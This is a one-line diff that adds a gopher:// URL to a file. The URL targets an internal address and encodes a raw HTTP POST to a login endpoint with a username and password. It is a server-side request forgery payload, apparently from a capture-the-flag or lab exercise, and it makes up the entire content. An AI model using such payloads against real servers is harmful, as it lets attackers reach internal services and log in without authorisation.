@@ -1,0 +1,1 @@
+gopher://10.10.10.3:80/_POST%20/login%20HTTP/1.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2041%0a%0ausername=white.rabbit&password=dontbelate
